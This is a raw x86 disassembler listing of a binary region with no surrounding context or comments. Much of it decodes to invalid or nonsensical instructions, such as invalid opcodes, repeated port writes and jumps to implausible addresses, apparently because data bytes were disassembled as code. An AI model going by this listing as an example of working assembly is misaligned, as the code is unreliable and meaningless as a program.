  422579:	test   BYTE PTR [ecx-0x1b],bl
  42257c:	out    0x3,al
  42257e:	ds pop ebx
  422580:	out    0x3,eax
  422582:	ds pop ebx
  422584:	sbb    eax,0xc2e5417c
  422589:	cmp    DWORD PTR [ecx],0x3182dee5
  42258f:	in     eax,0xe6
  422591:	add    edi,DWORD PTR [esi]
  422593:	pop    ebx
  422594:	out    0x3,eax
  422596:	ds pop ebx
  422598:	jmp    0x4f273f17
  42259d:	adc    BYTE PTR [ecx],0xe5
  4225a0:	out    0x3,al
  4225a2:	ds pop ebx
  4225a4:	out    0x3,eax
  4225a6:	ds pop ebx
  4225a8:	out    0x3,eax
  4225aa:	ds pop ebx
  4225ac:	out    0x3,eax
  4225ae:	ds pop ebx
  4225b0:	out    0x3,eax
  4225b2:	ds pop ebx
  4225b4:	xor    eax,DWORD PTR [edx-0x7e571b1f]
	...
  4225e2:	add    BYTE PTR [eax],al
  4225e4:	ftst   
  4225e6:	lods   al,BYTE PTR ds:[esi]
  4225e7:	adc    ecx,0xc981b2e4
  4225ed:	in     al,0xbe
  4225ef:	add    ecx,0xb981bae4
  4225f5:	in     al,0xe8
  4225f7:	xor    BYTE PTR [ecx-0x567f271c],0xe4
  4225fe:	int3   
  4225ff:	and    BYTE PTR [ecx-0x667f2d1c],0xe4
  422606:	fiadd  WORD PTR [eax-0x7ed51b6f]
  42260c:	mov    esp,esp
  42260e:	xor    BYTE PTR [ecx-0x7f031b7f],al
  422614:	jns    0x4225fa
  422616:	bound  eax,QWORD PTR [eax+0x52ffe471]
  42261c:	mov    esi,0xbe43fce4
  422621:	in     al,0xfc
  422623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422624:	mov    esi,0xbe2dfce4
  422629:	in     al,0xfc
  42262b:	aaa    
  42262c:	mov    esi,0xbe3ffce4
  422631:	in     al,0xfc
  422633:	jmp    0x4225ee
  422635:	in     al,0xfc
  422637:	fnstenv [ecx-0x41f2031c]
  42263d:	jecxz  0x42263b
  42263f:	repz mov eax,ds:0x99b3fce4
  422645:	in     al,0xfc
  422647:	mov    bh,0x0
	...
  422671:	add    BYTE PTR [ecx-0x7664031c],dl
  422677:	in     al,0xfc
  422679:	gs and esp,0xe4795bfc
  422680:	cld    
  422681:	dec    ebx
  422682:	jno    0x422668
  422684:	cld    
  422685:	cmp    eax,0x29fce469
  42268a:	popa   
  42268b:	in     al,0xfc
  42268d:	mov    ecx,0xbdfce3c6
  422692:	(bad)  
  422693:	jecxz  0x422691
  422695:	fnstenv [esi-0x4916031d]
  42269b:	jecxz  0x422699
  42269d:	fcmovnb st,st(6)
  42269f:	jecxz  0x42269d
  4226a1:	or     eax,edi
  4226a3:	jecxz  0x4226a1
  4226a5:	repz mov dh,0xe3
  4226a8:	cld    
  4226a9:	pop    ss
  4226aa:	mov    bh,0xe3
  4226ac:	cld    
  4226ad:	pop    ss
  4226ae:	(bad)  
  4226af:	jecxz  0x4226ad
  4226b1:	jns    0x42267a
  4226b3:	jecxz  0x4226b1
  4226b5:	inc    ecx
  4226b6:	mov    bh,0xe3
  4226b8:	cld    
  4226b9:	test   eax,0xfce3b7
  4226be:	mov    bl,0xd1
  4226c0:	cld    
  4226c1:	inc    ebp
  4226c3:	sar    esp,1
  4226c5:	jmp    ebp
  4226c7:	sar    esp,1
  4226c9:	(bad)  
  4226ca:	in     eax,dx
  4226cb:	sar    esp,1
  4226cd:	call   DWORD PTR [edi-0x2f]
  4226d0:	cld    
  4226d1:	inc    DWORD PTR [edi-0x2f]
  4226d4:	cld    
  4226d5:	inc    DWORD PTR [eax]
	...
  4226ff:	add    BYTE PTR [ecx-0x2f],al
  422702:	cld    
  422703:	call   DWORD PTR [edi+0x57]
  422706:	add    BYTE PTR [eax],al
  422708:	fst    st(4)
  42270a:	cld    
  42270b:	push   ebp
  42270d:	aam    0xfc
  42270f:	call   FWORD PTR [ebp-0x7200032b]
  422715:	aad    0xfc
  422717:	jmp    FWORD PTR [ebp-0x2b]
  42271a:	cld    
  42271b:	push   DWORD PTR [ecx-0x2b]
  42271e:	cld    
  42271f:	call   DWORD PTR [edi]
  422721:	pop    edi
  422722:	add    BYTE PTR [eax],al
  422724:	dec    edi
  422725:	aad    0xfc
  422727:	jmp    edi
  422729:	pop    esi
  42272a:	add    BYTE PTR [eax],al
  42272c:	not    esp
  42272e:	cld    
  42272f:	call   edi
  422731:	aad    0xfc
  422733:	dec    DWORD PTR [ebx]
  422735:	(bad)  
  422736:	cld    
  422737:	inc    DWORD PTR [ebp-0x2a]
  42273a:	cld    
  42273b:	push   DWORD PTR [edi]
  42273d:	(bad)  
  42273e:	cld    
  42273f:	call   DWORD PTR [edi]
  422741:	(bad)  
  422742:	cld    
  422743:	inc    DWORD PTR [edi]
  422745:	(bad)  
  422746:	cld    
  422747:	inc    DWORD PTR ds:0x75fffcd6
  42274d:	(bad)  
  42274e:	cld    
  42274f:	call   FWORD PTR [edi]
  422751:	aad    0xfc
  422753:	dec    DWORD PTR [edi]
  422755:	aad    0xfc
  422757:	jmp    DWORD PTR [edi-0x16ffffa2]
  42275d:	aam    0xfc
  42275f:	(bad)  
  422760:	ds hlt 
	...
  42278e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422790:	mov    edi,edi
  422792:	jns    0x422766
  422794:	mov    edi,edi
  422796:	jno    0x42278c
  422798:	add    BYTE PTR [eax],al
  42279a:	ds cld 
  42279c:	mov    bh,bh
  42279e:	popa   
  42279f:	or     BYTE PTR [ecx-0x73aba601],cl
  4227a5:	call   DWORD PTR [ecx+0x50]
  4227a8:	mov    edi,?
  4227aa:	dec    ecx
  4227ab:	inc    edx
  4227ac:	mov    edi,?
  4227ae:	inc    ecx
  4227af:	mov    dh,0x88
  4227b1:	(bad)  
  4227b2:	cmp    esp,esi
  4227b4:	add    BYTE PTR [eax],al
  4227b6:	ds mov esi,0x1229ff88
  4227bc:	mov    edi,edi
  4227be:	and    DWORD PTR [edx+0x7419ff88],ebp
  4227c4:	mov    edi,edi
  4227c6:	adc    DWORD PTR [esi-0x77],ebp
  4227c9:	dec    DWORD PTR [ecx]
  4227cb:	ins    BYTE PTR es:[edi],dx
  4227cc:	mov    edi,edi
  4227ce:	add    DWORD PTR [ecx+ecx*4-0x76720601],edx
  4227d5:	push   ecx
  4227d7:	and    eax,0x33e9ff89
  4227dc:	mov    edi,edi
  4227de:	loope  0x4227d3
  4227e0:	add    BYTE PTR [eax],al
  4227e2:	ds push ds
  4227e4:	mov    edi,?
  4227e6:	rcl    DWORD PTR [ecx],1
  4227e8:	mov    edi,?
  4227ea:	leave  
  4227eb:	repz add BYTE PTR [eax],al
  4227ee:	ds enter 0xff85,0x0
	...
  42281b:	add    BYTE PTR [ecx-0x4e007a4b],bh
  422821:	mov    cl,0x85
  422823:	jmp    FWORD PTR [ecx-0x5e007a39]
  422829:	sbb    eax,DWORD PTR [esi-0x64a56601]
  42282f:	xchg   BYTE PTR [ecx-0x767b171f],dl
  422835:	loope  0x42282f
  422837:	test   BYTE PTR [ecx+0x7984ece1],al
  42283d:	loope  0x422811
  42283f:	test   BYTE PTR [ecx-0x1f],dh
  422842:	mov    esi,0x2ae16984
  422847:	test   DWORD PTR [ecx-0x1f],esp
  42284a:	adc    BYTE PTR [ebp-0x7b231ea7],al
  422850:	push   ecx
  422851:	loope  0x4228b5
  422853:	test   DWORD PTR [ecx-0x1f],ecx
  422856:	jo     0x4227dd
  422858:	inc    ecx
  422859:	loope  0x4227db
  42285b:	test   DWORD PTR [ecx],edi
  42285d:	loope  0x4227e1
  42285f:	test   DWORD PTR [ecx],esi
  422861:	loope  0x42288d
  422863:	test   DWORD PTR [ecx],ebp
  422865:	loope  0x42287b
  422867:	test   DWORD PTR [ecx],esp
  422869:	loope  0x4228a7
  42286b:	test   DWORD PTR [ecx],ebx
  42286d:	loope  0x422857
  42286f:	xchg   DWORD PTR [ecx],edx
  422871:	loope  0x422869
  422873:	xchg   DWORD PTR [ecx],ecx
  422875:	loope  0x422841
  422877:	xchg   DWORD PTR [ecx],eax
  422879:	loope  0x42284b
  42287b:	xchg   ecx,edi
  42287d:	loopne 0x42282f
  42287f:	xchg   DWORD PTR [eax],eax
	...
  4228a9:	add    cl,dh
  4228ab:	loopne 0x422841
  4228ad:	xchg   ecx,ebp
  4228af:	loopne 0x422929
  4228b1:	xchg   ecx,esp
  4228b3:	loopne 0x422917
  4228b5:	mov    cl,bl
  4228b7:	loopne 0x422931
  4228b9:	xchg   ecx,edx
  4228bb:	loopne 0x422845
  4228bd:	xchg   ecx,ecx
  4228bf:	loopne 0x42285b
  4228c1:	xchg   ecx,eax
  4228c3:	loopne 0x42286b
  4228c5:	xchg   DWORD PTR [ecx-0x4e786920],edi
  4228cb:	loopne 0x422867
  4228cd:	xchg   DWORD PTR [ecx-0x46470020],ebp
  4228d3:	loopne 0x4228d1
  4228d5:	jmp    0xfc3f099a
  4228da:	mov    eax,0xc0cbfce0
  4228df:	loopne 0x4228dd
  4228e1:	sar    DWORD PTR [eax-0x3ec80320],cl
  4228e7:	loopne 0x4228e5
  4228e9:	pop    ss
  4228ea:	mov    ecx,0xc059fce0
  4228ef:	loopne 0x4228ed
  4228f1:	inc    ecx
  4228f2:	mov    eax,0xc0a9fce0
  4228f7:	loopne 0x4228f5
  4228f9:	xor    eax,0x4bfce0b8
  4228fe:	shl    al,0xfc
  422901:	pop    ebx
  422902:	mov    eax,0xc053fce0
  422907:	(bad)  
  422909:	fld    st(7)
  42290b:	(bad)  
  42290d:	or     DWORD PTR [eax],eax
	...
  422937:	add    BYTE PTR [edi+ebx*8-0x204bf804],dh
  42293e:	cld    
  42293f:	jmp    0xc3428481
  422944:	(bad)  
  422945:	(bad)  
  422947:	fwait
  422948:	mov    bh,0xdf
  42294a:	cld    
  42294b:	arpl   WORD PTR [edi-0x388c0321],si
  422951:	(bad)  
  422953:	push   ebx
  422954:	(bad)  
  422955:	(bad)  
  422957:	aas    
  422958:	mov    bh,0xdf
  42295a:	cld    
  42295b:	jmp    0x1142849d
  422960:	(bad)  
  422961:	(bad)  
  422963:	jmp    0xd94284a5
  422968:	rcr    bh,0xfc
  42296b:	jmp    0xf63f0928
  422970:	rcr    bh,0xfc
  422973:	add    BYTE PTR [ebp-0x28],al
  422976:	cld    
  422977:	jmp    DWORD PTR [edi+0x57fffcd8]
  42297d:	fdivr  st,st(4)
  42297f:	push   DWORD PTR [edi]
  422981:	fdivr  st,st(4)
  422983:	inc    DWORD PTR [ebp-0x28]
  422986:	cld    
  422987:	jmp    DWORD PTR ds:0x1ffffcd8
  42298d:	fdivr  st,st(4)
  42298f:	(bad)  
  422990:	out    dx,eax
  422991:	xlat   BYTE PTR ds:[ebx]
  422992:	cld    
  422993:	jmp    DWORD PTR [edi+0x5b]
  422996:	add    BYTE PTR [eax],al
  422998:	xor    eax,ebx
  42299a:	cld    
  42299b:	inc    DWORD PTR [eax]
	...
  4229c5:	add    BYTE PTR [edi+0x5b],dl
  4229c8:	add    BYTE PTR [eax],al
  4229ca:	mov    ch,0xd7
  4229cc:	cld    
  4229cd:	inc    DWORD PTR [ecx]
  4229cf:	fdivr  st,st(4)
  4229d1:	call   DWORD PTR [edi+0x5b]
  4229d4:	add    BYTE PTR [eax],al
  4229d6:	pop    edi
  4229d7:	sar    esp,cl
  4229d9:	push   DWORD PTR [ebx]
  4229db:	sar    esp,cl
  4229dd:	inc    DWORD PTR [edi-0x31]
  4229e0:	cld    
  4229e1:	(bad)  
  4229e2:	cmp    ecx,edi
  4229e4:	cld    
  4229e5:	jmp    DWORD PTR [ecx]
  4229e7:	sar    esp,cl
  4229e9:	jmp    ebp
  4229eb:	sar    ah,cl
  4229ed:	jmp    DWORD PTR [edi]
  4229ef:	pop    ebx
  4229f0:	add    BYTE PTR [eax],al
  4229f2:	std    
  4229f3:	sar    ah,cl
  4229f5:	push   DWORD PTR [ecx-0x2e00032e]
  4229fb:	sar    ah,cl
  4229fd:	jmp    DWORD PTR [edi-0x31]
  422a00:	cld    
  422a01:	jmp    FWORD PTR [ebp-0x31]
  422a04:	cld    
  422a05:	dec    DWORD PTR [edi-0x78000331]
  422a0b:	iret   
  422a0c:	cld    
  422a0d:	jmp    FWORD PTR [ebp-0x5a00032e]
  422a13:	sar    ah,cl
  422a15:	(bad)  
  422a16:	ds mov ah,0x88
  422a19:	(bad)  
  422a1a:	mov    ecx,0x3e0000f4
  422a1f:	mov    edx,0xea9ff88
  422a24:	mov    edi,edi
  422a26:	mov    eax,ds:0xf4
	...
  422a53:	add    BYTE PTR [esi],bh
  422a55:	out    dx,eax
  422a56:	add    BYTE PTR [ecx+0xc],al
  422a59:	dec    edi
  422a5a:	mov    ds:0xab362373,eax
  422a5f:	imul   ebx,DWORD PTR [ebx],0x33
  422a62:	add    al,0x3f
  422a64:	cmp    al,0x22
  422a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a67:	pop    esi
  422a68:	fisubr DWORD PTR ds:0xf3e36bab
  422a6e:	add    BYTE PTR [ecx],ah
  422a70:	xor    DWORD PTR ds:[eax-0x33a93294],esi
  422a77:	pop    esi
  422a78:	loopne 0x422a89
  422a7a:	lods   eax,DWORD PTR ds:[esi]
  422a7b:	bound  edi,QWORD PTR [esi]
  422a7d:	jns    0x422a7e
  422a7f:	push   esp
  422a80:	int3   
  422a81:	sbb    dh,BYTE PTR [ebp-0x52e47f9e]
  422a87:	bound  edi,QWORD PTR [esi]
  422a89:	test   DWORD PTR [ecx],0xaea8ad6c
  422a8f:	imul   ebx,DWORD PTR [ebx+0x19ffc416],0x64
  422a96:	add    al,0x45
  422a98:	mov    ds:0x9a5e9ec5,al
  422a9d:	mov    al,0xad
  422a9f:	pusha  
  422aa0:	xchg   ebp,eax
  422aa1:	hlt    
  422aa2:	add    BYTE PTR [ebp+0x6cacb53f],dh
  422aa8:	pop    esp
  422aa9:	shr    DWORD PTR [edx+edx*2+0x60add058],cl
  422ab0:	push   ebp
  422ab1:	hlt    
  422ab2:	add    ah,dh
  422ab4:	aas    
  422ab5:	shr    BYTE PTR [ebp+0x60],0x0
	...
  422ae0:	add    BYTE PTR [eax],al
  422ae2:	pop    edi
  422ae3:	pop    ebx
  422ae4:	push   ebx
  422ae5:	(bad)  
  422ae6:	dec    edi
  422ae7:	js     0x422b2d
  422ae9:	add    al,0xce
  422aeb:	pop    ebx
  422aec:	and    ebp,DWORD PTR [ebp-0x3cc483e2]
  422af2:	and    eax,0xa9a1566f
  422af7:	fstp   st(7)
  422af9:	add    BYTE PTR [edx],dl
  422afb:	push   0x3b
  422afd:	mov    dl,0x1e
  422aff:	imul   esi,DWORD PTR [eax],0xffffffc3
  422b02:	xchg   ecx,eax
  422b03:	(bad)  
  422b05:	add    BYTE PTR [edx],bl
  422b07:	push   0x13
  422b09:	mov    dl,0x1e
  422b0b:	jl     0x422b28
  422b0d:	ret    
  422b0e:	jns    0x422aed
  422b10:	cmc    
  422b11:	add    bh,bl
  422b13:	ja     0x422b10
  422b15:	(bad)
  422b18:	add    al,0xc3
  422b1a:	in     eax,dx
  422b1b:	data16 stc 
  422b1d:	stos   BYTE PTR es:[edi],al
  422b1e:	fbld   TBYTE PTR [edi-0xd]
  422b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b22:	into   
  422b23:	fwait
  422b24:	out    0x3,eax
  422b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b27:	pop    edx
  422b28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b29:	mov    ebx,0xa7c57bd1
  422b2e:	jl     0x422b9d
  422b30:	aad    0xaa
  422b32:	scas   eax,DWORD PTR es:[edi]
  422b33:	ins    BYTE PTR es:[edi],dx
  422b34:	aad    0xae
  422b36:	pushf  
  422b37:	ins    DWORD PTR es:[edi],dx
  422b38:	mov    bl,0xd0
  422b3a:	lods   eax,DWORD PTR ds:[esi]
  422b3b:	imul   eax,eax,0xa868a2ad
  422b41:	add    esi,DWORD PTR [edx]
  422b43:	pop    edx
  422b44:	scas   al,BYTE PTR es:[edi]
  422b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  422b6e:	add    BYTE PTR [eax],al
  422b70:	lea    edx,[ebp-0x77635070]
  422b76:	cmp    BYTE PTR [ecx+0x3cd5b5c],0x7f
  422b7d:	imul   ecx,DWORD PTR [edx+eiz*4-0x555a8993],0xa4007655
  422b88:	pushf  
  422b89:	ins    BYTE PTR es:[edi],dx
  422b8a:	jo     0x422b0c
  422b8c:	mov    ds:0x3de93f77,eax
  422b91:	pop    ebx
  422b92:	add    ch,BYTE PTR [ebx*4-0x1ebfa994]
  422b99:	addr16 dec ebp
  422b9b:	inc    edi
  422b9c:	js     0x422c13
  422b9e:	ins    BYTE PTR es:[edi],dx
  422b9f:	dec    esp
  422ba0:	inc    edx
  422ba1:	or     al,BYTE PTR [edx]
  422ba3:	adc    al,0xd0
  422ba5:	jno    0x422c06
  422ba7:	cmp    DWORD PTR [eax+0x75],esi
  422baa:	arpl   WORD PTR [esi],si
  422bac:	xor    DWORD PTR [esi+0x46],0x10
  422bb0:	into   
  422bb1:	jns    0x422bb3
  422bb3:	xchg   ebx,eax
  422bb4:	cmp    al,0x8f
  422bb6:	ins    DWORD PTR es:[edi],dx
  422bb7:	or     BYTE PTR [esi-0x53f49870],ah
  422bbd:	jge    0x422c31
  422bbf:	add    BYTE PTR [ebp-0x24],bh
  422bc2:	cld    
  422bc3:	sbb    bh,BYTE PTR ds:0x6dfd6396
  422bc9:	push   0x6d
  422bcb:	or     bh,BYTE PTR [ebp+0x78]
  422bce:	(bad)  fs:[eax+0xe9716b]
	...
  422bfd:	add    BYTE PTR ds:0xe0adfed7,bh
  422c03:	addr16 push esp
  422c05:	(bad)  
  422c06:	loopne 0x422c73
  422c08:	push   eax
  422c09:	enter  0x73f1,0x3f
  422c0d:	jmp    0xaa42544f
  422c12:	iret   
  422c13:	js     0x422c74
  422c15:	mov    ch,0xd8
  422c17:	xchg   edi,eax
  422c18:	addr16 fwait
  422c1a:	loopne 0x422c96
  422c1c:	je     0x422bac
  422c1e:	iret   
  422c1f:	fs aas 
  422c21:	jmp    0xa542a063
  422c26:	cwde   
  422c27:	outs   dx,DWORD PTR ds:[esi]
  422c28:	arpl   WORD PTR [eax],ax
  422c2a:	imul   esi,DWORD PTR [ebp-0x4b4c96be],0x3d
  422c31:	add    bh,ah
  422c33:	pop    eax
  422c34:	inc    ebx
  422c35:	gs dec ebx
  422c37:	sbb    esi,DWORD PTR [edx+0x72]
  422c3a:	gs mov edx,0xa507746a
  422c40:	imul   esp,DWORD PTR [ebx+0xa],0xffffffa4
  422c44:	outs   dx,DWORD PTR ds:[esi]
  422c45:	add    BYTE PTR [edi-0x496acac],dl
  422c4b:	mov    ecx,0xa4f6683f
  422c50:	push   eax
  422c51:	outs   dx,DWORD PTR ds:[esi]
  422c52:	bound  ebp,QWORD PTR [edx+0x14fe7468]
  422c58:	jbe    0x422cce
  422c5a:	cmp    dl,BYTE PTR [edi+0x28]
  422c5d:	add    DWORD PTR [eax-0x46],ebx
  422c60:	jo     0x422cae
	...
  422c8a:	add    BYTE PTR [eax],al
  422c8c:	inc    esi
  422c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c8e:	jo     0x422cd5
  422c90:	push   ebp
  422c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c92:	imul   esi,DWORD PTR [edx+0x57],0x57
  422c96:	adc    DWORD PTR [ebx],eax
  422c98:	xor    esp,DWORD PTR [eax+esi*2+0x6cb24472]
  422c9f:	inc    ecx
  422ca0:	addr16 push edi
  422ca2:	push   ebp
  422ca3:	add    BYTE PTR [ebp+eiz*4-0x45949e9f],dl
  422caa:	push   eax
  422cab:	outs   dx,DWORD PTR ds:[esi]
  422cac:	add    BYTE PTR [ebx],al
  422cae:	gs gs repz push cs
  422cb2:	xor    BYTE PTR [edx],dh
  422cb4:	les    eax,FWORD PTR [esi+ebx*2]
  422cb7:	jo     0x422c9d
  422cb9:	push   es
  422cba:	ins    BYTE PTR es:[edi],dx
  422cbb:	je     0x422ce4
  422cbd:	pop    edi
  422cbe:	and    DWORD PTR [edx],eax
  422cc0:	mov    bh,0x10
  422cc2:	ins    BYTE PTR es:[edi],dx
  422cc3:	arpl   WORD PTR [edx-0x1acc8fef],di
  422cc9:	pushf  
  422cca:	gs jb  0x422d0b
  422ccd:	cmc    
  422cce:	lods   al,BYTE PTR ds:[esi]
  422ccf:	push   ecx
  422cd1:	int3   
  422cd2:	add    cl,BYTE PTR [ebp+0x6e]
  422cd5:	out    0xa6,eax
  422cd7:	dec    edi
  422cd8:	ins    BYTE PTR es:[edi],dx
  422cd9:	jmp    0x558f8f83
  422cde:	add    DWORD PTR ds:0x6cb2f43c,esp
  422ce4:	pop    ebp
  422ce5:	daa    
  422ce6:	mov    ch,0x70
  422ce8:	or     eax,0x3662ca76
  422ced:	cmp    BYTE PTR [edi+ebp*4],al
	...
  422d18:	add    BYTE PTR [eax],al
  422d1a:	sub    BYTE PTR ds:[ebx-0x5475dd93],0x71
  422d22:	sub    eax,0x2a66c290
  422d27:	daa    
  422d28:	ret    
  422d29:	call   DWORD PTR [ecx+0xd6c05b1]
  422d2f:	js     0x422ce7
  422d31:	pusha  
  422d32:	adc    esi,DWORD PTR [ebx+ebp*4+0x3e]
  422d36:	ds add DWORD PTR cs:[esi-0x19],eax
  422d3b:	fstp   DWORD PTR [ebp+ecx*2+0x45b05be3]
  422d42:	xlat   BYTE PTR ds:[ebx]
  422d43:	addr16 lahf 
  422d45:	ds ds pop ds
  422d48:	add    DWORD PTR [esi-0x19],eax
  422d4b:	fstp   DWORD PTR [eax+eax*2+0x62b5b0da]
  422d52:	ds jo  0x422d58
  422d55:	inc    ebp
  422d56:	mov    ds:0x9a6cc7b8,eax
  422d5b:	scas   eax,DWORD PTR es:[edi]
  422d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d5d:	bound  esi,QWORD PTR [esi-0x5d]
  422d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d61:	arpl   WORD PTR [edx+0x19ffc39f],dx
  422d67:	cmp    al,BYTE PTR [eax*2+0x62cf109b]
  422d6e:	mov    WORD PTR [ebx-0x66],ds
  422d71:	lods   al,BYTE PTR ds:[esi]
  422d72:	xchg   edx,eax
  422d73:	dec    ecx
  422d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d75:	mov    ebx,0x4c15b38
  422d7a:	jnp    0x422dbc
  422d7c:	xchg   ebx,eax
  422d7d:	mov    DWORD PTR [eax],0x0
	...
  422da7:	add    BYTE PTR [edx+0x3e],bl
  422daa:	mov    BYTE PTR [edi-0x5e72dba4],ah
  422db0:	push   0x1c
  422db2:	out    0x3,eax
  422db4:	dec    edx
  422db5:	pop    esp
  422db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422db7:	mov    al,ds:0xb5602e4d
  422dbc:	dec    ebp
  422dbd:	inc    eax
  422dbe:	dec    esp
  422dbf:	retf   
  422dc0:	sub    eax,DWORD PTR [ecx+0x46]
  422dc3:	add    al,0xde
  422dc5:	pop    ebx
  422dc6:	es lahf 
  422dc8:	sub    eax,0x1daa5032
  422dcd:	dec    edx
  422dce:	ss mov ch,0xfd
  422dd1:	inc    ebx
  422dd2:	cmp    DWORD PTR [edi-0x49c1b0e2],ebx
  422dd8:	adc    BYTE PTR [edi+eiz*8],bl
  422ddb:	add    esi,ebx
  422ddd:	pop    ebx
  422dde:	es lahf 
  422de0:	in     eax,dx
  422de1:	sub    bl,BYTE PTR [ecx]
  422de3:	stos   DWORD PTR es:[edi],eax
  422de4:	jmp    0x422e21
  422de6:	adc    ebx,DWORD PTR [edi-0x5de9b307]
  422dec:	fadd   DWORD PTR [esi+0x4]
  422def:	aad    0xcd
  422df1:	dec    esp
  422df2:	add    BYTE PTR [edx+0x3e71bda],ch
  422df8:	les    ebx,FWORD PTR [edx+edi*4-0x62]
  422dfc:	int    0x1d
  422dfe:	aam    0xb5
  422e00:	scas   eax,DWORD PTR es:[edi]
  422e01:	lds    ebp,FWORD PTR ds:[edi-0x6126bd83]
  422e08:	sahf   
  422e09:	dec    edi
  422e0a:	(bad)  
  422e0b:	mov    ch,0x0
	...
  422e35:	add    BYTE PTR [eax-0x75fc18e6],ch
  422e3b:	pop    edx
  422e3c:	add    BYTE PTR [esi-0x44afb350],ch
  422e42:	aam    0x4e
  422e44:	pop    edi
  422e45:	popf   
  422e46:	mov    al,ds:0x9f8e7228
  422e4b:	inc    ecx
  422e4c:	ins    BYTE PTR es:[edi],dx
  422e4d:	mov    WORD PTR [edx],cs
  422e4f:	ds popa 
  422e51:	xchg   ebp,eax
  422e52:	xchg   esp,eax
  422e53:	inc    edi
  422e54:	outs   dx,BYTE PTR ds:[esi]
  422e55:	mov    bh,0x9c
  422e57:	inc    ebp
  422e58:	arpl   WORD PTR [edx-0x4],di
  422e5b:	fdivr  st,st(4)
  422e5d:	mov    al,ds:0x75631e3c
  422e62:	in     eax,dx
  422e63:	dec    edx
  422e64:	addr16 pop edi
  422e66:	popf   
  422e67:	dec    esp
  422e68:	arpl   WORD PTR [ecx],di
  422e6a:	lock inc edi
  422e6c:	inc    ax
  422e6e:	out    0x3d,al
  422e70:	inc    edi
  422e71:	aas    
  422e72:	out    dx,al
  422e73:	cdq    
  422e74:	add    bh,al
  422e76:	cmp    eax,0x8335631e
  422e7b:	dec    ebp
  422e7c:	jb     0x422eb9
  422e7e:	mov    cl,0x46
  422e80:	je     0x422ea7
  422e82:	aad    0x4a
  422e84:	arpl   WORD PTR [edx],cx
  422e86:	into   
  422e87:	inc    edi
  422e88:	jb     0x422eaa
  422e8a:	jge    0x422e64
  422e8c:	cld    
  422e8d:	idiv   DWORD PTR [edx]
  422e8f:	inc    edi
  422e90:	jno    0x422ea7
  422e92:	mov    al,0x44
  422e94:	arpl   WORD PTR [edi],dx
  422e96:	(bad)  
  422e97:	fdivr  st,st(4)
  422e99:	in     al,dx
	...
  422ec2:	add    BYTE PTR [eax],al
  422ec4:	inc    ebx
  422ec5:	and    al,0x73
  422ec7:	add    eax,0xf042418e
  422ecc:	cdq    
  422ecd:	cmp    eax,0x416ed654
  422ed2:	les    eax,FWORD PTR fs:[edx]
  422ed5:	inc    eax
  422ed6:	pop    edi
  422ed7:	fstp   TBYTE PTR ds:0xc8a5fee4
  422edd:	dec    ebx
  422ede:	push   esp
  422edf:	add    BYTE PTR [esi],cl
  422ee1:	jmp    DWORD PTR [edi+0x43]
  422ee4:	or     BYTE PTR [ecx],cl
  422ee6:	imul   esi,DWORD PTR [edi+eiz*1+0x5c],0xffffffb7
  422eeb:	add    ah,BYTE PTR [edi+edi*8+0x5ba76561]
  422ef2:	xor    al,BYTE PTR [ecx]
  422ef4:	mov    al,ds:0xb84d70f8
  422ef9:	div    DWORD PTR [ecx+0x6c]
  422efc:	ret    0x6599
  422eff:	ins    BYTE PTR es:[edi],dx
  422f00:	mov    dl,0xa1
  422f02:	pop    ebp
  422f03:	ins    DWORD PTR es:[edi],dx
  422f04:	ret    0xfc9c
  422f07:	inc    DWORD PTR [eax+0x5d]
  422f0a:	dec    esp
  422f0b:	inc    ebx
  422f0c:	stos   BYTE PTR es:[edi],al
  422f0d:	cld    
  422f0e:	ins    BYTE PTR es:[edi],dx
  422f0f:	push   ebx
  422f10:	arpl   WORD PTR ds:0x9e006e66,cx
  422f16:	cld    
  422f17:	jmp    FWORD PTR [edi+ebx*2]
  422f1a:	inc    ecx
  422f1b:	js     0x422f1b
  422f1d:	or     cl,BYTE PTR [ebp+0x72]
  422f20:	or     ah,bh
  422f22:	popa   
  422f23:	jae    0x422f79
  422f25:	pop    edi
  422f26:	lods   eax,DWORD PTR ds:[esi]
  422f27:	add    al,BYTE PTR [eax]
	...
  422f51:	add    BYTE PTR [edx+edi*8],dh
  422f54:	jo     0x422fab
  422f56:	dec    ecx
  422f57:	pop    es
  422f58:	pop    esi
  422f59:	outs   dx,BYTE PTR ds:[esi]
  422f5a:	xor    eax,DWORD PTR [ebx]
  422f5c:	bound  esp,QWORD PTR [edx+eiz*1+0x17]
  422f60:	pusha  
  422f61:	gs push edi
  422f63:	or     esp,DWORD PTR [esi+0x6f]
  422f66:	imul   edx,DWORD PTR ds:0xfa636c66,0xfa2c006e
  422f70:	outs   dx,BYTE PTR ds:[esi]
  422f71:	outs   dx,BYTE PTR ds:[esi]
  422f72:	inc    edx
  422f73:	add    esi,DWORD PTR [eax]
  422f75:	xor    cl,BYTE PTR [ecx+0x576c68f7]
  422f7b:	pop    ebx
  422f7c:	xchg   DWORD PTR [eax],eax
  422f7e:	in     al,0xc
  422f80:	bound  esp,QWORD PTR [ecx+0x3e]
  422f83:	mov    eax,0xb2b2509f
  422f88:	lahf   
  422f89:	pop    esi
  422f8a:	xchg   ebx,eax
  422f8b:	or     eax,0xa88147a3
  422f90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f91:	popa   
  422f92:	lahf   
  422f93:	mov    al,ds:0xfd3e9500
  422f98:	lahf   
  422f99:	jae    0x423011
  422f9b:	add    eax,0xe35c6ca5
  422fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fa1:	inc    ebp
  422fa2:	ins    BYTE PTR es:[edi],dx
  422fa3:	frstor [edi-0x600d8db0]
  422fa9:	pop    esi
  422faa:	push   ebx
  422fab:	les    eax,FWORD PTR [eax]
  422fad:	push   cs
  422fae:	add    DWORD PTR ds:[esi-0x5c18b3c0],esp
  422fb5:	jae    0x422fb7
	...
